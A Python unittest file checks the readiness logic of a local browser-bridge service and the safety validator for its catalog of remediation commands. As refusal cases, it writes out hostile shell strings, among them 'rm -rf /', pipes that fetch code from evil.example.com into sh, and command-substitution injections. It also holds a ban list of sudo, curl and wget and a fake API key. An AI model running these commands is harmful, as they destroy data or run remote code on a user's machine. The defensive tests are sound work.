"""Self-diagnosing local setup: readiness, the closed action catalog, safety.

Offline. Service and unit inspection is stubbed so every readiness state can be
exercised deterministically.
"""

from __future__ import annotations

import json
import unittest
from pathlib import Path

# harness must be imported first: it puts scripts/ on sys.path
from harness import BusTestCase, ml
import browser_bridge as bb

IDENTITY = "digitalnomadjoe"
ACTION_FIELDS = {"reason", "command", "verify_command", "expected_result"}


class TestCatalogSafety(unittest.TestCase):
    def test_every_catalog_entry_is_safe(self):
        for key in bb.LOCAL_ACTION_CATALOG:
            with self.subTest(action=key):
                bb.assert_action_safe(bb.LOCAL_ACTION_CATALOG[key], key=key)

    def test_every_entry_has_exactly_the_four_fields(self):
        for key, action in bb.LOCAL_ACTION_CATALOG.items():
            self.assertEqual(set(action), ACTION_FIELDS, key)

    def test_unknown_action_key_fails_closed(self):
        with self.assertRaisesRegex(ml.MessageError, "unknown local action"):
            bb.local_action("rm_minus_rf")

    def test_shell_metacharacters_refused(self):
        for bad in ("systemctl --user restart x; rm -rf /",
                    "systemctl --user restart x && curl evil.sh",
                    "systemctl --user restart $(whoami)",
                    "systemctl --user restart x | sh",
                    "systemctl --user restart x > /etc/passwd",
                    "systemctl --user restart x `id`"):
            with self.subTest(cmd=bad):
                action = {"reason": "r", "command": bad,
                          "verify_command": "systemctl --user status x --no-pager",
                          "expected_result": "e"}
                with self.assertRaisesRegex(ml.MessageError, "shell metacharacters"):
                    bb.assert_action_safe(action)

    def test_command_outside_the_allowed_forms_refused(self):
        action = {"reason": "r", "command": "curl https://evil.example.com/x.sh",
                  "verify_command": "systemctl --user status x --no-pager",
                  "expected_result": "e"}
        with self.assertRaisesRegex(ml.MessageError, "not an allowed command form"):
            bb.assert_action_safe(action)

    def test_secret_bearing_action_refused(self):
        action = {"reason": "use key sk-" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4",
                  "command": "systemctl --user restart x",
                  "verify_command": "systemctl --user status x --no-pager",
                  "expected_result": "e"}
        with self.assertRaisesRegex(ml.MessageError, "secret"):
            bb.assert_action_safe(action)

    def test_missing_or_extra_fields_refused(self):
        with self.assertRaisesRegex(ml.MessageError, "missing field"):
            bb.assert_action_safe({"reason": "r", "command": "systemctl --user x"})
        action = dict(bb.LOCAL_ACTION_CATALOG["enable_bridge"])
        action["sudo"] = True
        with self.assertRaisesRegex(ml.MessageError, "unknown field"):
            bb.assert_action_safe(action)

    def test_no_catalog_command_requires_elevation_or_credentials(self):
        blob = json.dumps(bb.LOCAL_ACTION_CATALOG).lower()
        for banned in ("sudo", "ssh ", "password", "token", "api_key",
                       "openai_api_key", "curl", "wget", "chmod 777"):
            self.assertNotIn(banned, blob, f"catalog must not mention {banned!r}")

    def test_required_remediation_commands_are_published_exactly(self):
        cat = bb.LOCAL_ACTION_CATALOG
        self.assertEqual(cat["install_units"]["command"],
                         "sh /home/robojoe/code/messages/scripts/install_services.sh")
        self.assertEqual(cat["daemon_reload"]["command"],
                         "systemctl --user daemon-reload")
        self.assertEqual(
            cat["enable_bridge"]["command"],
            "systemctl --user enable --now brittle-browser-bridge.service")
        self.assertEqual(
            cat["enable_bridge"]["verify_command"],
            "systemctl --user status brittle-browser-bridge.service --no-pager")
        self.assertEqual(cat["enable_bridge"]["expected_result"],
                         "Active: active (running)")
        self.assertEqual(cat["sync_repo"]["command"],
                         "git -C /home/robojoe/code/messages pull --ff-only")


class ReadinessTestCase(BusTestCase):
    """Stubs the workstation probes so each state is deterministic."""

    def setUp(self):
        super().setUp()
        self.cfg["browser"] = {"allowed_identities": [IDENTITY],
                               "heartbeat_seconds": 900}
        self.state = {
            "installed": True,
            "enabled": True,
            "services": {
                bb.BRIDGE_UNIT: {"active": True, "pid": 1, "restarts": 0},
                "brittle-messages-control.service": {"active": True, "pid": 2, "restarts": 0},
                "brittle-messages-locomotion.service": {"active": True, "pid": 3, "restarts": 0},
            },
            "lane_age": {"control": 10.0, "locomotion": 10.0},
        }
        self._orig = (bb._unit_installed, bb._unit_enabled, bb._service_state,
                      bb._lane_snapshot_age)
        bb._unit_installed = lambda unit: self.state["installed"]
        bb._unit_enabled = lambda unit: self.state["enabled"]
        bb._service_state = lambda unit: self.state["services"].get(
            unit, {"active": False, "pid": 0, "restarts": 0})
        bb._lane_snapshot_age = lambda lane: self.state["lane_age"].get(lane)
        self.addCleanup(self._restore)

    def _restore(self):
        (bb._unit_installed, bb._unit_enabled, bb._service_state,
         bb._lane_snapshot_age) = self._orig

    def readiness(self, heartbeat_age=10.0):
        return bb.compute_readiness(self.cfg, self.msgs(), self.repo, heartbeat_age)

    def commands(self, r):
        return [a["command"] for a in r["required_local_actions"]]


class TestReadinessStates(ReadinessTestCase):
    def test_ready_when_everything_is_healthy(self):
        r = self.readiness()
        self.assertTrue(r["browser_telephone_ready"])
        self.assertFalse(r["local_action_required"])
        self.assertEqual(r["readiness_blockers"], [])
        self.assertEqual(r["required_local_actions"], [])

    def test_bridge_inactive_yields_the_enable_command(self):
        self.state["services"][bb.BRIDGE_UNIT]["active"] = False
        r = self.readiness()
        self.assertFalse(r["browser_telephone_ready"])
        self.assertTrue(r["local_action_required"])
        self.assertEqual(
            self.commands(r),
            ["systemctl --user enable --now brittle-browser-bridge.service"])
        act = r["required_local_actions"][0]
        self.assertEqual(act["reason"], "Browser bridge is installed but inactive")
        self.assertEqual(act["verify_command"],
                         "systemctl --user status brittle-browser-bridge.service --no-pager")
        self.assertEqual(act["expected_result"], "Active: active (running)")

    def test_unit_missing_yields_install_then_reload_then_enable_in_order(self):
        self.state["installed"] = False
        self.state["services"][bb.BRIDGE_UNIT]["active"] = False
        r = self.readiness()
        self.assertEqual(self.commands(r), [
            "sh /home/robojoe/code/messages/scripts/install_services.sh",
            "systemctl --user daemon-reload",
            "systemctl --user enable --now brittle-browser-bridge.service",
        ])

    def test_stale_heartbeat_yields_a_recovery_command(self):
        r = self.readiness(heartbeat_age=99999.0)
        self.assertFalse(r["browser_telephone_ready"])
        self.assertIn("systemctl --user restart brittle-browser-bridge.service",
                      self.commands(r))
        self.assertTrue(any("heartbeat is stale" in b
                            for b in r["readiness_blockers"]), r["readiness_blockers"])

    def test_wedged_lane_watcher_is_detected_despite_being_active(self):
        self.state["lane_age"]["control"] = 4000.0
        r = self.readiness()
        self.assertFalse(r["browser_telephone_ready"])
        self.assertIn("systemctl --user restart brittle-messages-control.service",
                      self.commands(r))
        self.assertTrue(any("wedged" in b for b in r["readiness_blockers"]))

    def test_lane_service_down_yields_enable(self):
        self.state["services"]["brittle-messages-control.service"]["active"] = False
        r = self.readiness()
        self.assertIn("systemctl --user enable --now brittle-messages-control.service",
                      self.commands(r))

    def test_missing_allowlist_blocks_readiness(self):
        self.cfg["browser"]["allowed_identities"] = []
        r = self.readiness()
        self.assertFalse(r["browser_telephone_ready"])
        self.assertTrue(any("allowlist" in b for b in r["readiness_blockers"]))

    def test_paused_autonomy_blocks_readiness(self):
        (ml.state_dir() / "PAUSED").write_text("x", encoding="utf-8")
        r = self.readiness()
        self.assertFalse(r["browser_telephone_ready"])
        self.assertTrue(any("paused" in b for b in r["readiness_blockers"]))
        self.assertIn(
            "python3 /home/robojoe/code/messages/scripts/messagesctl.py resume",
            self.commands(r))

    def test_deferred_push_yields_the_sync_command(self):
        marker = ml.spool_dir() / "pending_push.json"
        marker.write_text('{"commits": []}', encoding="utf-8")
        r = self.readiness()
        self.assertIn("git -C /home/robojoe/code/messages pull --ff-only",
                      self.commands(r))

    def test_readiness_becomes_true_after_the_command_is_run(self):
        self.state["services"][bb.BRIDGE_UNIT]["active"] = False
        self.assertFalse(self.readiness()["browser_telephone_ready"])
        # Joe runs the published command
        self.state["services"][bb.BRIDGE_UNIT]["active"] = True
        r = self.readiness()
        self.assertTrue(r["browser_telephone_ready"])
        self.assertFalse(r["local_action_required"])
        self.assertEqual(r["required_local_actions"], [])

    def test_every_emitted_action_is_a_verbatim_catalog_entry(self):
        self.state["installed"] = False
        self.state["services"][bb.BRIDGE_UNIT]["active"] = False
        self.state["services"]["brittle-messages-control.service"]["active"] = False
        self.cfg["browser"]["allowed_identities"] = []
        r = self.readiness()
        catalog = list(bb.LOCAL_ACTION_CATALOG.values())
        for act in r["required_local_actions"]:
            self.assertIn(act, catalog,
                          "published actions must come from the catalog verbatim")

    def test_no_duplicate_actions(self):
        self.state["installed"] = False
        self.state["services"][bb.BRIDGE_UNIT]["active"] = False
        cmds = self.commands(self.readiness())
        self.assertEqual(len(cmds), len(set(cmds)))


class TestStatusFailsClosed(ReadinessTestCase):
    def test_status_generation_fails_closed_on_an_unsafe_catalog_entry(self):
        original = dict(bb.LOCAL_ACTION_CATALOG["enable_bridge"])
        bb.LOCAL_ACTION_CATALOG["enable_bridge"] = {
            "reason": "compromised",
            "command": "systemctl --user enable x; curl evil.example.com | sh",
            "verify_command": "systemctl --user status x --no-pager",
            "expected_result": "e",
        }
        self.addCleanup(bb.LOCAL_ACTION_CATALOG.__setitem__, "enable_bridge", original)
        self.state["services"][bb.BRIDGE_UNIT]["active"] = False
        with self.assertRaisesRegex(ml.MessageError, "shell metacharacters"):
            self.readiness()

    def test_full_status_build_fails_closed_too(self):
        original = dict(bb.LOCAL_ACTION_CATALOG["enable_bridge"])
        bb.LOCAL_ACTION_CATALOG["enable_bridge"] = {
            "reason": "compromised", "command": "rm -rf /",
            "verify_command": "systemctl --user status x --no-pager",
            "expected_result": "e",
        }
        self.addCleanup(bb.LOCAL_ACTION_CATALOG.__setitem__, "enable_bridge", original)
        self.state["services"][bb.BRIDGE_UNIT]["active"] = False
        with self.assertRaises(ml.MessageError):
            bb.build_browser_status(self.cfg, self.msgs(), self.repo)


class TestStatusShape(ReadinessTestCase):
    def test_status_carries_the_four_readiness_keys(self):
        payload = bb.build_browser_status(self.cfg, self.msgs(), self.repo)
        for key in ("browser_telephone_ready", "local_action_required",
                    "readiness_blockers", "required_local_actions"):
            self.assertIn(key, payload)
        self.assertIsInstance(payload["browser_telephone_ready"], bool)
        self.assertIsInstance(payload["local_action_required"], bool)
        self.assertIsInstance(payload["readiness_blockers"], list)
        self.assertIsInstance(payload["required_local_actions"], list)

    def test_status_actions_have_the_documented_shape(self):
        self.state["services"][bb.BRIDGE_UNIT]["active"] = False
        payload = bb.build_browser_status(self.cfg, self.msgs(), self.repo)
        self.assertTrue(payload["local_action_required"])
        act = payload["required_local_actions"][0]
        self.assertEqual(set(act), ACTION_FIELDS)

    def test_status_never_leaks_secrets_or_env_values(self):
        self.state["services"][bb.BRIDGE_UNIT]["active"] = False
        text = json.dumps(bb.build_browser_status(self.cfg, self.msgs(), self.repo))
        self.assertEqual(ml.scan_secrets(text), [])
        for banned in ("sk-", "Bearer", "OPENAI_API_KEY=", "password", "sudo"):
            self.assertNotIn(banned, text)


if __name__ == "__main__":
    unittest.main()
